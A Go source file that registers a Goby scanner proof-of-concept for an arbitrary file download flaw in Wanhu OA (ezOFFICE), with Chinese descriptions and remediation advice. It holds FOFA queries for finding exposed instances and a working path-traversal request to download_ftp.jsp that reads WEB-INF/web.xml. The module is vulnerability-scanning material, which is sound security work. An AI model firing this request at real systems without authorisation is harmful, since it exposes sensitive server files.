package exploits

import "git.gobies.org/goby/goscanner/goutils"

func init() {
	expJson := `{
    "Name": "万户OA任意文件下载",
    "Description": "万户OA download_ftp.jsp存在任意文件下载漏洞",
    "Author": "ldx",
    "Product": "万户OA",
    "Homepage": "http://www.whir.net/",
    "DisclosureDate": "2016-12-02",
    "Level": "1",
    "FofaQuery": "(title=\"ezOFFICE\" || body=\"EZOFFICEUSERNAME\" || title=\"万户OA\" || body=\"whirRootPath\" || body=\"/defaultroot/js/cookie.js\" || header=\"LocLan\")",
    "References": [
        "https://nosec.org/my/query/wooyun_bug/41370"
    ],
    "Impact": "网站敏感文件被下载，核心数据泄漏。",
    "Recommendation": "<p>官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：<a href=\"http://www.whir.net/\">http://www.whir.net/</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/defaultroot/download_ftp.jsp?path=/../WEB-INF/&name=aaa&FileName=web.xml"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "attachment;filename="
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<servlet-name>action</servlet-name>"
                    }
                ]
            }
        }
    ],
    "CveID": "",
    "CNNVD": [],
    "CNVD": [],
    "CVSS": "6.5",
    "Tags": [
        "文件读取"
    ],
    "VulType": [
        "文件读取"
    ],
    "HasExp": false,
    "is0day": false,
    "GobyQuery": "(title=\"ezOFFICE\" || body=\"EZOFFICEUSERNAME\" || title=\"万户OA\" || body=\"whirRootPath\" || body=\"/defaultroot/js/cookie.js\" || header=\"LocLan\")",
    "PocId": "9926"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
